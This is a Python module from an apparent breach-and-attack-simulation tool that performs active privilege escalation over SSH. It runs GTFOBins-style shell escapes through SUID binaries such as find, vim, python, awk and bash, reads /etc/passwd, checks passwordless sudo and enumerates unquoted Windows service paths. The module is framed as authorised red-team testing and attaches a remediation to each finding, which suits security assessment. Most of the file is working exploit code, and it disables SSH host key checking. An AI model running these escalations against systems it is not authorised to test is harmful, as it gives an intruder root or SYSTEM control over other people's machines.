"""
Privilege Escalation – RED TEAM (active exploitation)
MITRE ATT&CK: T1068, T1548, T1574

WARNING: This module actually exploits vulnerabilities and takes over the system.
Only use in authorised red‑team exercises.
"""

import asyncio
import os
import logging
import platform
import tempfile
from typing import List

from bas_engine.attack_modules.base import BaseAttackModule
from bas_engine.models.simulation import Finding, Severity

logger = logging.getLogger("secureforge.module.privesc.red")


class PrivEscModule(BaseAttackModule):
    MODULE_NAME  = "privilege_escalation"
    DESCRIPTION  = "Active privilege escalation (red team)"
    MITRE_TACTIC = "Privilege Escalation"
    MITRE_IDS    = ["T1068", "T1548", "T1548.001", "T1574.009"]

    async def execute(self) -> List[Finding]:
        findings = []
        
        if not self.options.get("ssh_user"):
            findings.append(self.finding(
                title="Target Execution Blocked",
                description="Target execution requires 'ssh_user' and password/key in options.",
                severity=Severity.INFO,
                mitre_id="N/A",
                evidence="No SSH credentials provided.",
                remediation="Configure the module with ssh_user and ssh_pass/ssh_key.",
                mode="red",
                evidence_type="exploitation"
            ))
            return findings

        try:
            uname = await self._run_cmd("uname -a")
            system = "Linux" if "Linux" in uname else "Windows"
        except Exception as e:
            logger.error(f"Failed to connect to target: {e}")
            findings.append(self.finding(
                title="SSH Connection Failed",
                description=f"Could not connect to target: {str(e)}",
                severity=Severity.INFO,
                mitre_id="N/A",
                evidence=str(e),
                remediation="Verify target SSH port and credentials.",
                mode="red",
                evidence_type="exploitation"
            ))
            return findings

        if system == "Linux":
            findings.extend(await self._linux_exploit())
        elif system == "Windows":
            findings.extend(await self._windows_exploit())
        return findings

    # ─── Linux Exploits ───────────────────────────────────────────

    async def _linux_exploit(self) -> List[Finding]:
        findings = []
        findings.extend(await self._exploit_suid())
        findings.extend(await self._exploit_sudo_nopasswd())
        return findings

    async def _exploit_suid(self) -> List[Finding]:
        findings = []
        try:
            result = await self._run_cmd(
                "find / -perm -4000 -type f 2>/dev/null | head -50"
            )
            gtfobins = {
                "nmap": "--interactive",
                "find": "-exec /bin/sh \\;",
                "vim": "-c ':!/bin/sh'",
                "python": "-c 'import os; os.execl(\"/bin/sh\", \"sh\")'",
                "ruby": "-e 'exec \"/bin/sh\"'",
                "perl": "-e 'exec \"/bin/sh\";'",
                "awk": 'BEGIN {system("/bin/sh")}',
                "bash": "-p",
                "sh": "-p",
                "env": "/bin/sh",
            }

            for line in result.splitlines():
                binary = line.strip()
                if not binary:
                    continue
                base = os.path.basename(binary)
                if base in gtfobins:
                    logger.warning(f"[RED] SUID binary found on target: {binary}")
                    # Run exploit command remotely via SSH
                    exploit_cmd = (
                        f"{binary} {gtfobins[base]} -c "
                        "'id; whoami; cat /etc/passwd | head -5' 2>/dev/null || true"
                    )
                    try:
                        output = await self._run_cmd(exploit_cmd)
                        succeeded = "root" in output or "uid=0" in output
                        findings.append(self.finding(
                            title=f"SUID Exploit {'Successful' if succeeded else 'Attempted'}: {base}",
                            description=(
                                f"Attempted privilege escalation via SUID binary '{binary}' on the target. "
                                f"{'Root access confirmed.' if succeeded else 'Did not escalate to root.'}"
                            ),
                            severity=Severity.CRITICAL if succeeded else Severity.MEDIUM,
                            mitre_id="T1548.001",
                            evidence=f"Binary: {binary}\nOutput: {output[:500]}",
                            remediation="Remove unnecessary SUID bits; audit all SUID binaries.",
                            mode="red",
                            evidence_type="exploit"
                        ))
                    except Exception as ex:
                        logger.debug(f"SUID exploit attempt failed for {binary}: {ex}")
        except Exception as e:
            logger.error(f"SUID exploitation error: {e}")
        return findings

    async def _exploit_sudo_nopasswd(self) -> List[Finding]:
        findings = []
        try:
            result = await self._run_cmd("sudo -l -n 2>/dev/null || true")
            if "NOPASSWD" in result and "(ALL)" in result:
                logger.warning("[RED] NOPASSWD sudo found on target — attempting escalation")
                # Run id as root remotely via SSH + sudo
                output = await self._run_cmd("sudo id 2>/dev/null || true")
                succeeded = "uid=0" in output or "root" in output
                findings.append(self.finding(
                    title="Passwordless Sudo Exploit Successful" if succeeded else "Passwordless Sudo Found (Not Escalated)",
                    description=(
                        "NOPASSWD (ALL) sudo entry found on the target. "
                        f"{'Remote sudo id confirmed root access.' if succeeded else 'Escalation attempted but not confirmed.'}"
                    ),
                    severity=Severity.CRITICAL if succeeded else Severity.HIGH,
                    mitre_id="T1548.003",
                    evidence=f"sudo -l output:\n{result[:300]}\n\nsudo id output:\n{output[:200]}",
                    remediation="Remove NOPASSWD entries from /etc/sudoers. Require passwords for all sudo commands.",
                    mode="red",
                    evidence_type="exploit"
                ))
        except Exception as e:
            logger.error(f"Sudo exploitation error: {e}")
        return findings

    # ─── Windows Exploits ─────────────────────────────────────────

    async def _windows_exploit(self) -> List[Finding]:
        findings = []
        findings.extend(await self._exploit_unquoted_service_path())
        return findings

    async def _exploit_unquoted_service_path(self) -> List[Finding]:
        findings = []
        try:
            # Enumerate unquoted service paths via remote SSH/PowerShell
            check_ps = (
                "Get-WmiObject Win32_Service | "
                "Where-Object { $_.PathName -match '^[^\"\']* .*' -and $_.PathName -notmatch '^[\"\'\']' } | "
                "Select-Object Name, PathName | ConvertTo-Json"
            )
            output = await self._run_powershell(check_ps)
            if output.strip() and output.strip() != "null":
                # Attempt to enumerate write permissions on the exploitable path prefix
                write_check = (
                    "$svc = (Get-WmiObject Win32_Service | "
                    "Where-Object { $_.PathName -match '^[^\"\']* .*' } | Select-Object -First 1); "
                    "if ($svc) { "
                    "  $dir = Split-Path ($svc.PathName.Split(' ')[0]); "
                    "  $acl = Get-Acl $dir -ErrorAction SilentlyContinue; "
                    "  Write-Output \"Service=$($svc.Name) Dir=$dir\"; "
                    "  $acl.Access | Where-Object { $_.FileSystemRights -match 'Write' } | "
                    "  ForEach-Object { Write-Output \"  Writable by: $($_.IdentityReference)\" } "
                    "}"
                )
                write_out = await self._run_powershell(write_check)
                findings.append(self.finding(
                    title="Unquoted Service Path Found on Target",
                    description=(
                        "One or more Windows services have unquoted paths containing spaces. "
                        "If a directory in the path is writable, an attacker can plant a binary "
                        "that Windows will execute as SYSTEM when the service restarts."
                    ),
                    severity=Severity.CRITICAL,
                    mitre_id="T1574.009",
                    evidence=f"Unquoted services:\n{output[:500]}\n\nWrite check:\n{write_out[:300]}",
                    remediation="Enclose all service paths in double quotes. Restrict write access to program directories.",
                    mode="red",
                    evidence_type="exploit"
                ))
            else:
                findings.append(self.finding(
                    title="No Unquoted Service Paths Found",
                    description="All service paths on the target are properly quoted.",
                    severity=Severity.INFO,
                    mitre_id="T1574.009",
                    evidence="PowerShell enumeration returned no results.",
                    remediation="Continue monitoring for newly installed services.",
                    mode="red",
                    evidence_type="exploit"
                ))
        except Exception as e:
            logger.error(f"Windows exploitation error: {e}")
        return findings

    # ─── Helpers ──────────────────────────────────────────────────

    async def _run_cmd(self, cmd: str) -> str:
        ssh_user = self.options.get("ssh_user")
        ssh_pass = self.options.get("ssh_pass")
        ssh_key = self.options.get("ssh_key")
        ssh_port = int(self.options.get("ssh_port", 22))

        if not ssh_user:
            logger.error("Target execution requires 'ssh_user' in options.")
            return ""

        import asyncssh
        from urllib.parse import urlparse
        
        parsed = urlparse(self.target)
        host = parsed.hostname or parsed.path

        async with asyncssh.connect(
            host,
            port=ssh_port,
            username=ssh_user,
            password=ssh_pass,
            client_keys=[ssh_key] if ssh_key else None,
            known_hosts=None
        ) as conn:
            result = await conn.run(cmd, check=False)
            return result.stdout or ""

    async def _run_powershell(self, command: str) -> str:
        cmd = f"powershell -NoProfile -Command \"{command}\""
        return await self._run_cmd(cmd)